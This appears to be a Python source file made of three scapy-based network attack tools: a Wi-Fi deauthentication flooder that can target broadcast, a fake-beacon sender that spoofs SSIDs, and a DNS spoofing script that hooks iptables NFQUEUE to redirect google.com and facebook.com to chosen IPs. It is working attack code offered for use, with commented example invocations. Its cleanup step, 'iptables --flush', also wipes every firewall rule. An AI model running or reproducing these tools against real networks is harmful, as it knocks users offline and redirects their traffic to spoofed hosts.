import platform
if platform.system() == 'Darwin':
    from scapy.all import Dot11, Dot11Deauth, RadioTap, sendp
else:
    from scapy.layers.dot11 import Dot11, Dot11Deauth, RadioTap
    from scapy.sendrecv import sendp

def deauth(target_mac, gateway_mac, inter=0.1, count=None, loop=1, iface="wlan0mon", verbose=1):
    # 802.11 frame
    # addr1: destination MAC
    # addr2: source MAC
    # addr3: Access Point MAC
    dot11 = Dot11(addr1=target_mac, addr2=gateway_mac, addr3=gateway_mac)
    # stack them up
    packet = RadioTap()/dot11/Dot11Deauth(reason=7)
    # send the packet
    sendp(packet, inter=inter, count=count, loop=loop, iface=iface, verbose=verbose)

    """
    x – the packets

    inter – time (in s) between two packets (default 0)

    loop – send packet indefinitely (default 0)

    count – number of packets to send (default None=1)

    verbose – verbose mode (default None=conf.verbose)

    realtime – check that a packet was sent before sending the next one

    return_packets – return the sent packets

    socket – the socket to use (default is conf.L3socket(kargs))

    iface – the interface to send the packets on

    monitor – (not on linux) send in monitor mode
    
    """

# target_mac = "00:ae:fa:81:e2:5e" # or use "ff:ff:ff:ff:ff:ff" (broadcast) instead of one specific target
# gateway_mac = "e8:94:f6:c4:97:3f"
# deauth(target_mac, gateway_mac, iface="wlan0mon", inter=0.1, count=100, verbose=1)


from scapy.all import Dot11Beacon, RandMAC, Dot11Elt
# from scapy.layers.dot11 import Dot11Beacon, Dot11Elt
# from scapy.volatile import RandMAC

def send_beacon(ssid: str, iface: str, mac: str, infinite: bool=True):
    # 802.11 frame
    dot11 = Dot11(type=0, subtype=8, addr1="ff:ff:ff:ff:ff:ff", addr2=mac, addr3=mac)
    # beacon layer
    # ESS+privacy to appear as secured on some devices
    beacon = Dot11Beacon(cap="ESS+privacy")
    # putting ssid in the frame
    essid = Dot11Elt(ID="SSID", info=ssid, len=len(ssid))
    # stack all the layers and add a RadioTap
    frame = RadioTap()/dot11/beacon/essid
    # send the frame in layer 2 every 100 milliseconds forever
    # using the `iface` interface
    sendp(frame, inter=0.1, loop=1, iface=iface, verbose=0)

# send_beacon('Some Name', 'wlan0mon', RandMAC(), True)

from platform import system
from scapy.all import *
# from scapy.layers.inet import IP, UDP
# from scapy.layers.dns import DNSRR, DNSQR, DNS
if system() != 'Linux': raise 'Attack only supported on linux.'
from netfilterqueue import NetfilterQueue
import os

# DNS mapping records, feel free to add/modify this dictionary
# for example, google.com will be redirected to 192.168.1.100
dns_hosts = {
    b"www.google.com.": "192.168.1.100",
    b"google.com.": "192.168.1.100",
    b"facebook.com.": "172.217.19.142"
}

def process_packet(packet):
    """
    Whenever a new packet is redirected to the netfilter queue,
    this callback is called.
    """
    # convert netfilter queue packet to scapy packet
    scapy_packet = IP(packet.get_payload())
    if scapy_packet.haslayer(DNSRR):
        # if the packet is a DNS Resource Record (DNS reply)
        # modify the packet
        print("[Before]:", scapy_packet.summary())
        try:
            scapy_packet = modify_packet(scapy_packet)
        except IndexError:
            # not UDP packet, this can be IPerror/UDPerror packets
            pass
        print("[After ]:", scapy_packet.summary())
        # set back as netfilter queue packet
        packet.set_payload(bytes(scapy_packet))
    # accept the packet
    packet.accept()


def modify_packet(packet):
    """
    Modifies the DNS Resource Record `packet` ( the answer part)
    to map our globally defined `dns_hosts` dictionary.
    For instance, whenver we see a google.com answer, this function replaces 
    the real IP address (172.217.19.142) with fake IP address (192.168.1.100)
    """
    # get the DNS question name, the domain name
    qname = packet[DNSQR].qname
    if qname not in dns_hosts:
        # if the website isn't in our record
        # we don't wanna modify that
        print("no modification:", qname)
        return packet
    # craft new answer, overriding the original
    # setting the rdata for the IP we want to redirect (spoofed)
    # for instance, google.com will be mapped to "192.168.1.100"
    packet[DNS].an = DNSRR(rrname=qname, rdata=dns_hosts[qname])
    # set the answer count to 1
    packet[DNS].ancount = 1
    # delete checksums and length of packet, because we have modified the packet
    # new calculations are required ( scapy will do automatically )
    del packet[IP].len
    del packet[IP].chksum
    del packet[UDP].len
    del packet[UDP].chksum
    # return the modified packet
    return packet


if __name__ == "__main__":
    QUEUE_NUM = 0
    # insert the iptables FORWARD rule
    os.system("iptables -I FORWARD -j NFQUEUE --queue-num {}".format(QUEUE_NUM))
    # instantiate the netfilter queue
    queue = NetfilterQueue()
    try:
        # bind the queue number to our callback `process_packet`
        # and start it
        queue.bind(QUEUE_NUM, process_packet)
        queue.run()
    except KeyboardInterrupt:
        # if want to exit, make sure we
        # remove that rule we just inserted, going back to normal.
        os.system("iptables --flush")